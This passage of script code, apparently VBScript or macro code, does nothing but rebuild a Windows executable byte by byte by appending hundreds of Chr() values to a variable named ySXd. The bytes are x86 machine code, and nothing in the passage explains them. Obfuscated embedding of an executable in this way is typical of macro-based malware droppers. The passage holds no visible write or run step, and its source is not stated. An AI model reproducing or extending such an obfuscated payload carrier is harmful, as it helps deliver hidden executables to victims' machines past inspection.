ySXd=ySXd&Chr(208)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(125)&Chr(8)&Chr(0)&Chr(116)&Chr(9)&Chr(139)&Chr(69)&Chr(8)&Chr(131)&Chr(69)&Chr(8)&Chr(4)&Chr(137)&Chr(16)&Chr(255)&Chr(1)&Chr(51)&Chr(219)&Chr(67)&Chr(51)&Chr(201)&Chr(235)&Chr(2)&Chr(70)&Chr(65)&Chr(128)&Chr(62)&Chr(92)&Chr(116)&Chr(249)&Chr(128)&Chr(62)&Chr(34)&Chr(117)&Chr(38)&Chr(246)&Chr(193)&Chr(1)&Chr(117)&Chr(31)&Chr(131)&Chr(125)&Chr(252)&Chr(0)&Chr(116)&Chr(12)&Chr(141)&Chr(70)&Chr(1)&Chr(128)&Chr(56)&Chr(34)&Chr(117)&Chr(4)&Chr(139)&Chr(240)&Chr(235)&Chr(13)&Chr(51)&Chr(192)&Chr(51)&Chr(219)&Chr(57)&Chr(69)&Chr(252)&Chr(15)&Chr(148)&Chr(192)&Chr(137)&Chr(69)&Chr(252)&Chr(209)&Chr(233)&Chr(133)&Chr(201)&Chr(116)&Chr(18)&Chr(73)&Chr(133)&Chr(210)&Chr(116)&Chr(4)&Chr(198)&Chr(2)&Chr(92)&Chr(66)&Chr(255)&Chr(7)&Chr(133)&Chr(201)&Chr(117)&Chr(241)&Chr(137)&Chr(85)&Chr(12)
ySXd=ySXd&Chr(138)&Chr(6)&Chr(132)&Chr(192)&Chr(116)&Chr(85)&Chr(131)&Chr(125)&Chr(252)&Chr(0)&Chr(117)&Chr(8)&Chr(60)&Chr(32)&Chr(116)&Chr(75)&Chr(60)&Chr(9)&Chr(116)&Chr(71)&Chr(133)&Chr(219)&Chr(116)&Chr(61)&Chr(15)&Chr(190)&Chr(192)&Chr(80)&Chr(133)&Chr(210)&Chr(116)&Chr(35)&Chr(232)&Chr(43)&Chr(27)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(13)&Chr(138)&Chr(6)&Chr(139)&Chr(77)&Chr(12)&Chr(255)&Chr(69)&Chr(12)&Chr(136)&Chr(1)&Chr(70)&Chr(255)&Chr(7)&Chr(139)&Chr(77)&Chr(12)&Chr(138)&Chr(6)&Chr(255)&Chr(69)&Chr(12)&Chr(136)&Chr(1)&Chr(235)&Chr(13)&Chr(232)&Chr(8)&Chr(27)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(70)&Chr(255)&Chr(7)&Chr(255)&Chr(7)&Chr(139)&Chr(85)&Chr(12)&Chr(70)&Chr(233)&Chr(86)&Chr(255)&Chr(255)&Chr(255)&Chr(133)&Chr(210)&Chr(116)&Chr(7)&Chr(198)&Chr(2)&Chr(0)&Chr(66)&Chr(137)
ySXd=ySXd&Chr(85)&Chr(12)&Chr(255)&Chr(7)&Chr(139)&Chr(77)&Chr(16)&Chr(233)&Chr(14)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(91)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(131)&Chr(32)&Chr(0)&Chr(255)&Chr(1)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(12)&Chr(83)&Chr(51)&Chr(219)&Chr(86)&Chr(87)&Chr(57)&Chr(29)&Chr(236)&Chr(183)&Chr(64)&Chr(0)&Chr(117)&Chr(5)&Chr(232)&Chr(147)&Chr(33)&Chr(0)&Chr(0)&Chr(104)&Chr(4)&Chr(1)&Chr(0)&Chr(0)&Chr(190)&Chr(184)&Chr(175)&Chr(64)&Chr(0)&Chr(118)&Chr(83)&Chr(136)&Chr(29)&Chr(188)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(36)&Chr(128)&Chr(64)&Chr(0)&Chr(161)&Chr(248)&Chr(183)&Chr(64)&Chr(0)&Chr(137)&Chr(53)&Chr(140)&Chr(172)&Chr(64)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(7)&Chr(137)&Chr(69)&Chr(252)&Chr(56)&Chr(24)&Chr(117)&Chr(3)
ySXd=ySXd&Chr(137)&Chr(117)&Chr(252)&Chr(139)&Chr(85)&Chr(252)&Chr(141)&Chr(69)&Chr(248)&Chr(80)&Chr(83)&Chr(83)&Chr(141)&Chr(125)&Chr(244)&Chr(232)&Chr(10)&Chr(254)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(248)&Chr(131)&Chr(196)&Chr(12)&Chr(61)&Chr(255)&Chr(255)&Chr(255)&Chr(63)&Chr(115)&Chr(74)&Chr(139)&Chr(77)&Chr(244)&Chr(131)&Chr(249)&Chr(255)&Chr(115)&Chr(66)&Chr(139)&Chr(248)&Chr(193)&Chr(231)&Chr(2)&Chr(141)&Chr(4)&Chr(15)&Chr(59)&Chr(193)&Chr(114)&Chr(54)&Chr(80)&Chr(232)&Chr(214)&Chr(33)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(89)&Chr(59)&Chr(243)&Chr(116)&Chr(41)&Chr(139)&Chr(85)&Chr(252)&Chr(141)&Chr(69)&Chr(248)&Chr(80)&Chr(3)&Chr(254)&Chr(87)&Chr(86)&Chr(141)&Chr(125)&Chr(244)&Chr(232)&Chr(201)&Chr(253)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(248)&Chr(131)&Chr(196)&Chr(12)&Chr(72)&Chr(163)&Chr(112)&Chr(172)&Chr(64)&Chr(0)&Chr(137)&Chr(53)&Chr(116)
ySXd=ySXd&Chr(172)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(235)&Chr(3)&Chr(131)&Chr(200)&Chr(255)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(161)&Chr(192)&Chr(176)&Chr(64)&Chr(0)&Chr(131)&Chr(236)&Chr(12)&Chr(83)&Chr(86)&Chr(139)&Chr(53)&Chr(60)&Chr(128)&Chr(64)&Chr(0)&Chr(87)&Chr(51)&Chr(219)&Chr(51)&Chr(255)&Chr(59)&Chr(195)&Chr(117)&Chr(46)&Chr(255)&Chr(214)&Chr(139)&Chr(248)&Chr(59)&Chr(251)&Chr(116)&Chr(12)&Chr(199)&Chr(5)&Chr(192)&Chr(176)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(35)&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(120)&Chr(117)&Chr(10)&Chr(106)&Chr(2)&Chr(88)&Chr(163)&Chr(192)&Chr(176)&Chr(64)&Chr(0)&Chr(235)&Chr(5)&Chr(161)&Chr(192)&Chr(176)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(1)&Chr(15)&Chr(133)&Chr(129)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(59)&Chr(251)&Chr(117)&Chr(15)&Chr(255)&Chr(214)&Chr(139)&Chr(248)&Chr(59)&Chr(251)&Chr(117)&Chr(7)&Chr(51)&Chr(192)&Chr(233)&Chr(202)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(199)&Chr(102)&Chr(57)&Chr(31)&Chr(116)&Chr(14)&Chr(64)&Chr(64)&Chr(102)&Chr(57)&Chr(24)&Chr(117)&Chr(249)&Chr(64)&Chr(64)&Chr(102)&Chr(57)&Chr(24)&Chr(117)&Chr(242)&Chr(139)&Chr(53)&Chr(52)&Chr(128)&Chr(64)&Chr(0)&Chr(83)&Chr(83)&Chr(83)&Chr(43)&Chr(199)&Chr(83)&Chr(209)&Chr(248)&Chr(64)&Chr(80)&Chr(87)&Chr(83)&Chr(83)&Chr(137)&Chr(69)&Chr(244)&Chr(255)&Chr(214)&Chr(137)&Chr(69)&Chr(248)&Chr(59)&Chr(195)&Chr(116)&Chr(47)&Chr(80)&Chr(232)&Chr(252)&Chr(32)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(69)&Chr(252)&Chr(59)&Chr(195)&Chr(116)&Chr(33)&Chr(83)&Chr(83)&Chr(255)&Chr(117)&Chr(248)&Chr(80)&Chr(255)&Chr(117)&Chr(244)&Chr(87)&Chr(83)&Chr(83)&Chr(255)&Chr(214)&Chr(133)
ySXd=ySXd&Chr(192)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(252)&Chr(232)&Chr(76)&Chr(32)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(93)&Chr(252)&Chr(139)&Chr(93)&Chr(252)&Chr(87)&Chr(255)&Chr(21)&Chr(48)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(195)&Chr(235)&Chr(92)&Chr(131)&Chr(248)&Chr(2)&Chr(116)&Chr(4)&Chr(59)&Chr(195)&Chr(117)&Chr(130)&Chr(255)&Chr(21)&Chr(44)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(240)&Chr(59)&Chr(243)&Chr(15)&Chr(132)&Chr(114)&Chr(255)&Chr(255)&Chr(255)&Chr(56)&Chr(30)&Chr(116)&Chr(10)&Chr(64)&Chr(56)&Chr(24)&Chr(117)&Chr(251)&Chr(64)&Chr(56)&Chr(24)&Chr(117)&Chr(246)&Chr(43)&Chr(198)&Chr(64)&Chr(80)&Chr(137)&Chr(69)&Chr(248)&Chr(232)&Chr(149)&Chr(32)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(89)&Chr(59)&Chr(251)&Chr(117)&Chr(12)&Chr(86)&Chr(255)&Chr(21)&Chr(40)&Chr(128)&Chr(64)&Chr(0)&Chr(233)&Chr(69)&Chr(255)&Chr(255)&Chr(255)&Chr(255)
ySXd=ySXd&Chr(117)&Chr(248)&Chr(86)&Chr(87)&Chr(232)&Chr(87)&Chr(33)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(86)&Chr(255)&Chr(21)&Chr(40)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(199)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(106)&Chr(84)&Chr(104)&Chr(24)&Chr(147)&Chr(64)&Chr(0)&Chr(232)&Chr(98)&Chr(8)&Chr(0)&Chr(0)&Chr(51)&Chr(255)&Chr(137)&Chr(125)&Chr(252)&Chr(141)&Chr(69)&Chr(156)&Chr(80)&Chr(255)&Chr(21)&Chr(4)&Chr(128)&Chr(64)&Chr(0)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(106)&Chr(64)&Chr(106)&Chr(32)&Chr(94)&Chr(86)&Chr(232)&Chr(127)&Chr(32)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(59)&Chr(199)&Chr(15)&Chr(132)&Chr(20)&Chr(2)&Chr(0)&Chr(0)&Chr(163)&Chr(224)&Chr(182)&Chr(64)&Chr(0)&Chr(137)&Chr(53)&Chr(208)&Chr(182)&Chr(64)&Chr(0)&Chr(141)&Chr(136)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(235)&Chr(48)
ySXd=ySXd&Chr(198)&Chr(64)&Chr(4)&Chr(0)&Chr(131)&Chr(8)&Chr(255)&Chr(198)&Chr(64)&Chr(5)&Chr(10)&Chr(137)&Chr(120)&Chr(8)&Chr(198)&Chr(64)&Chr(36)&Chr(0)&Chr(198)&Chr(64)&Chr(37)&Chr(10)&Chr(198)&Chr(64)&Chr(38)&Chr(10)&Chr(137)&Chr(120)&Chr(56)&Chr(198)&Chr(64)&Chr(52)&Chr(0)&Chr(131)&Chr(192)&Chr(64)&Chr(139)&Chr(13)&Chr(224)&Chr(182)&Chr(64)&Chr(0)&Chr(129)&Chr(193)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(59)&Chr(193)&Chr(114)&Chr(204)&Chr(102)&Chr(57)&Chr(125)&Chr(206)&Chr(15)&Chr(132)&Chr(10)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(208)&Chr(59)&Chr(199)&Chr(15)&Chr(132)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(56)&Chr(141)&Chr(88)&Chr(4)&Chr(141)&Chr(4)&Chr(59)&Chr(137)&Chr(69)&Chr(228)&Chr(190)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(59)&Chr(254)&Chr(124)&Chr(2)&Chr(139)&Chr(254)&Chr(199)&Chr(69)&Chr(224)&Chr(1)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(235)&Chr(91)&Chr(106)&Chr(64)&Chr(106)&Chr(32)&Chr(232)&Chr(241)&Chr(31)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(86)&Chr(139)&Chr(77)&Chr(224)&Chr(141)&Chr(12)&Chr(141)&Chr(224)&Chr(182)&Chr(64)&Chr(0)&Chr(137)&Chr(1)&Chr(131)&Chr(5)&Chr(208)&Chr(182)&Chr(64)&Chr(0)&Chr(32)&Chr(141)&Chr(144)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(235)&Chr(42)&Chr(198)&Chr(64)&Chr(4)&Chr(0)&Chr(131)&Chr(8)&Chr(255)&Chr(198)&Chr(64)&Chr(5)&Chr(10)&Chr(131)&Chr(96)&Chr(8)&Chr(0)&Chr(128)&Chr(96)&Chr(36)&Chr(128)&Chr(198)&Chr(64)&Chr(37)&Chr(10)&Chr(198)&Chr(64)&Chr(38)&Chr(10)&Chr(131)&Chr(96)&Chr(56)&Chr(0)&Chr(198)&Chr(64)&Chr(52)&Chr(0)&Chr(131)&Chr(192)&Chr(64)&Chr(139)&Chr(17)&Chr(3)&Chr(214)&Chr(59)&Chr(194)&Chr(114)&Chr(210)&Chr(255)&Chr(69)&Chr(224)&Chr(57)&Chr(61)&Chr(208)&Chr(182)&Chr(64)
ySXd=ySXd&Chr(0)&Chr(124)&Chr(157)&Chr(235)&Chr(6)&Chr(139)&Chr(61)&Chr(208)&Chr(182)&Chr(64)&Chr(0)&Chr(131)&Chr(101)&Chr(224)&Chr(0)&Chr(133)&Chr(255)&Chr(126)&Chr(109)&Chr(139)&Chr(69)&Chr(228)&Chr(139)&Chr(8)&Chr(131)&Chr(249)&Chr(255)&Chr(116)&Chr(86)&Chr(131)&Chr(249)&Chr(254)&Chr(116)&Chr(81)&Chr(138)&Chr(3)&Chr(168)&Chr(1)&Chr(116)&Chr(75)&Chr(168)&Chr(8)&Chr(117)&Chr(11)&Chr(81)&Chr(255)&Chr(21)&Chr(68)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(60)&Chr(139)&Chr(117)&Chr(224)&Chr(139)&Chr(198)&Chr(193)&Chr(248)&Chr(5)&Chr(131)&Chr(230)&Chr(31)&Chr(193)&Chr(230)&Chr(6)&Chr(3)&Chr(52)&Chr(133)&Chr(224)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(228)&Chr(139)&Chr(0)&Chr(137)&Chr(6)&Chr(138)&Chr(3)&Chr(136)&Chr(70)&Chr(4)&Chr(104)&Chr(160)&Chr(15)&Chr(0)&Chr(0)&Chr(141)&Chr(70)&Chr(12)&Chr(80)&Chr(232)&Chr(26)&Chr(18)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(201)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(70)&Chr(8)&Chr(255)&Chr(69)&Chr(224)&Chr(67)&Chr(131)&Chr(69)&Chr(228)&Chr(4)&Chr(57)&Chr(125)&Chr(224)&Chr(124)&Chr(147)&Chr(51)&Chr(219)&Chr(139)&Chr(243)&Chr(193)&Chr(230)&Chr(6)&Chr(3)&Chr(53)&Chr(224)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(6)&Chr(131)&Chr(248)&Chr(255)&Chr(116)&Chr(11)&Chr(131)&Chr(248)&Chr(254)&Chr(116)&Chr(6)&Chr(128)&Chr(78)&Chr(4)&Chr(128)&Chr(235)&Chr(114)&Chr(198)&Chr(70)&Chr(4)&Chr(129)&Chr(133)&Chr(219)&Chr(117)&Chr(5)&Chr(106)&Chr(246)&Chr(88)&Chr(235)&Chr(10)&Chr(139)&Chr(195)&Chr(72)&Chr(247)&Chr(216)&Chr(27)&Chr(192)&Chr(131)&Chr(192)&Chr(245)&Chr(80)&Chr(255)&Chr(21)&Chr(32)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(248)&Chr(131)&Chr(255)&Chr(255)&Chr(116)&Chr(67)&Chr(133)&Chr(255)&Chr(116)&Chr(63)
ySXd=ySXd&Chr(87)&Chr(255)&Chr(21)&Chr(68)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(52)&Chr(137)&Chr(62)&Chr(37)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(248)&Chr(2)&Chr(117)&Chr(6)&Chr(128)&Chr(78)&Chr(4)&Chr(64)&Chr(235)&Chr(9)&Chr(131)&Chr(248)&Chr(3)&Chr(117)&Chr(4)&Chr(128)&Chr(78)&Chr(4)&Chr(8)&Chr(104)&Chr(160)&Chr(15)&Chr(0)&Chr(0)&Chr(141)&Chr(70)&Chr(12)&Chr(80)&Chr(232)&Chr(132)&Chr(17)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(55)&Chr(255)&Chr(70)&Chr(8)&Chr(235)&Chr(10)&Chr(128)&Chr(78)&Chr(4)&Chr(64)&Chr(199)&Chr(6)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(67)&Chr(131)&Chr(251)&Chr(3)&Chr(15)&Chr(140)&Chr(103)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(208)&Chr(182)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(64)&Chr(128)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(235)&Chr(17)&Chr(51)
ySXd=ySXd&Chr(192)&Chr(64)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(200)&Chr(255)&Chr(232)&Chr(96)&Chr(6)&Chr(0)&Chr(0)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(184)&Chr(192)&Chr(146)&Chr(64)&Chr(0)&Chr(190)&Chr(192)&Chr(146)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(248)&Chr(59)&Chr(198)&Chr(115)&Chr(15)&Chr(139)&Chr(7)&Chr(133)&Chr(192)&Chr(116)&Chr(2)&Chr(255)&Chr(208)&Chr(131)&Chr(199)&Chr(4)&Chr(59)&Chr(254)&Chr(114)&Chr(241)&Chr(95)&Chr(94)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(184)&Chr(200)&Chr(146)&Chr(64)&Chr(0)&Chr(190)&Chr(200)&Chr(146)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(248)&Chr(59)&Chr(198)&Chr(115)&Chr(15)&Chr(139)&Chr(7)&Chr(133)&Chr(192)&Chr(116)&Chr(2)&Chr(255)&Chr(208)&Chr(131)&Chr(199)&Chr(4)&Chr(59)&Chr(254)&Chr(114)&Chr(241)&Chr(95)&Chr(94)&Chr(195)&Chr(139)&Chr(255)
ySXd=ySXd&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(255)&Chr(53)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(139)&Chr(53)&Chr(76)&Chr(128)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(116)&Chr(33)&Chr(161)&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(255)&Chr(116)&Chr(23)&Chr(80)&Chr(255)&Chr(53)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(255)&Chr(208)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(139)&Chr(128)&Chr(248)&Chr(1)&Chr(0)&Chr(0)&Chr(235)&Chr(39)&Chr(190)&Chr(148)&Chr(135)&Chr(64)&Chr(0)&Chr(86)&Chr(255)&Chr(21)&Chr(12)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(11)&Chr(86)&Chr(232)&Chr(203)&Chr(241)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(24)&Chr(104)&Chr(132)&Chr(135)&Chr(64)&Chr(0)&Chr(80)&Chr(255)&Chr(21)&Chr(20)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(255)&Chr(117)
ySXd=ySXd&Chr(8)&Chr(255)&Chr(208)&Chr(137)&Chr(69)&Chr(8)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(93)&Chr(195)&Chr(106)&Chr(0)&Chr(232)&Chr(135)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(255)&Chr(53)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(139)&Chr(53)&Chr(76)&Chr(128)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(116)&Chr(33)&Chr(161)&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(255)&Chr(116)&Chr(23)&Chr(80)&Chr(255)&Chr(53)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(255)&Chr(208)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(139)&Chr(128)&Chr(252)&Chr(1)&Chr(0)&Chr(0)&Chr(235)&Chr(39)&Chr(190)&Chr(148)&Chr(135)&Chr(64)&Chr(0)&Chr(86)&Chr(255)&Chr(21)&Chr(12)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(11)&Chr(86)&Chr(232)&Chr(80)&Chr(241)&Chr(255)&Chr(255)
ySXd=ySXd&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(24)&Chr(104)&Chr(176)&Chr(135)&Chr(64)&Chr(0)&Chr(80)&Chr(255)&Chr(21)&Chr(20)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(208)&Chr(137)&Chr(69)&Chr(8)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(93)&Chr(195)&Chr(255)&Chr(21)&Chr(80)&Chr(128)&Chr(64)&Chr(0)&Chr(194)&Chr(4)&Chr(0)&Chr(139)&Chr(255)&Chr(86)&Chr(255)&Chr(53)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(76)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(240)&Chr(133)&Chr(246)&Chr(117)&Chr(27)&Chr(255)&Chr(53)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(101)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(240)&Chr(86)&Chr(255)&Chr(53)&Chr(20)&Chr(161)&Chr(64)&Chr(171)&Chr(255)&Chr(21)&Chr(84)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(198)&Chr(94)&Chr(195)&Chr(161)&Chr(16)&Chr(161)&Chr(64)
ySXd=ySXd&Chr(0)&Chr(131)&Chr(248)&Chr(255)&Chr(116)&Chr(22)&Chr(80)&Chr(255)&Chr(53)&Chr(208)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(59)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(208)&Chr(131)&Chr(13)&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(161)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(255)&Chr(116)&Chr(14)&Chr(80)&Chr(255)&Chr(21)&Chr(88)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(13)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(233)&Chr(134)&Chr(7)&Chr(0)&Chr(0)&Chr(106)&Chr(12)&Chr(104)&Chr(56)&Chr(147)&Chr(64)&Chr(0)&Chr(232)&Chr(91)&Chr(4)&Chr(0)&Chr(0)&Chr(190)&Chr(148)&Chr(135)&Chr(64)&Chr(0)&Chr(86)&Chr(255)&Chr(21)&Chr(12)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(7)&Chr(86)&Chr(232)&Chr(145)&Chr(240)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(228)&Chr(139)&Chr(117)&Chr(8)&Chr(199)&Chr(70)
ySXd=ySXd&Chr(92)&Chr(8)&Chr(135)&Chr(64)&Chr(0)&Chr(51)&Chr(255)&Chr(71)&Chr(137)&Chr(126)&Chr(20)&Chr(133)&Chr(192)&Chr(116)&Chr(36)&Chr(104)&Chr(132)&Chr(135)&Chr(64)&Chr(0)&Chr(80)&Chr(139)&Chr(29)&Chr(20)&Chr(128)&Chr(64)&Chr(0)&Chr(255)&Chr(211)&Chr(137)&Chr(134)&Chr(248)&Chr(1)&Chr(0)&Chr(0)&Chr(104)&Chr(176)&Chr(135)&Chr(64)&Chr(0)&Chr(255)&Chr(117)&Chr(228)&Chr(255)&Chr(211)&Chr(137)&Chr(134)&Chr(252)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(126)&Chr(112)&Chr(198)&Chr(134)&Chr(200)&Chr(0)&Chr(0)&Chr(0)&Chr(67)&Chr(198)&Chr(134)&Chr(75)&Chr(1)&Chr(0)&Chr(0)&Chr(67)&Chr(199)&Chr(70)&Chr(104)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(106)&Chr(13)&Chr(232)&Chr(58)&Chr(8)&Chr(0)&Chr(0)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(255)&Chr(118)&Chr(104)&Chr(255)&Chr(21)&Chr(92)&Chr(128)&Chr(64)&Chr(0)&Chr(199)&Chr(69)&Chr(252)&Chr(254)
ySXd=ySXd&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(62)&Chr(0)&Chr(0)&Chr(0)&Chr(106)&Chr(12)&Chr(232)&Chr(25)&Chr(8)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(125)&Chr(252)&Chr(139)&Chr(69)&Chr(12)&Chr(137)&Chr(70)&Chr(108)&Chr(133)&Chr(192)&Chr(117)&Chr(8)&Chr(161)&Chr(232)&Chr(169)&Chr(64)&Chr(0)&Chr(137)&Chr(70)&Chr(108)&Chr(255)&Chr(118)&Chr(108)&Chr(232)&Chr(49)&Chr(33)&Chr(0)&Chr(0)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(21)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(222)&Chr(3)&Chr(0)&Chr(0)&Chr(195)&Chr(51)&Chr(255)&Chr(71)&Chr(139)&Chr(117)&Chr(8)&Chr(106)&Chr(13)&Chr(232)&Chr(1)&Chr(7)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(106)&Chr(12)&Chr(232)&Chr(248)&Chr(6)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(87)&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(255)&Chr(53)
ySXd=ySXd&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(139)&Chr(248)&Chr(232)&Chr(145)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(208)&Chr(139)&Chr(240)&Chr(133)&Chr(246)&Chr(117)&Chr(78)&Chr(104)&Chr(20)&Chr(2)&Chr(0)&Chr(0)&Chr(106)&Chr(1)&Chr(232)&Chr(147)&Chr(27)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(89)&Chr(89)&Chr(133)&Chr(246)&Chr(116)&Chr(58)&Chr(86)&Chr(255)&Chr(53)&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(53)&Chr(204)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(232)&Chr(253)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(208)&Chr(133)&Chr(192)&Chr(116)&Chr(24)&Chr(106)&Chr(0)&Chr(86)&Chr(232)&Chr(197)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(255)&Chr(21)&Chr(100)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(78)&Chr(4)&Chr(255)&Chr(137)&Chr(6)&Chr(235)&Chr(9)&Chr(86)&Chr(232)&Chr(129)&Chr(26)&Chr(0)&Chr(0)&Chr(89)&Chr(51)&Chr(246)&Chr(87)&Chr(255)&Chr(21)
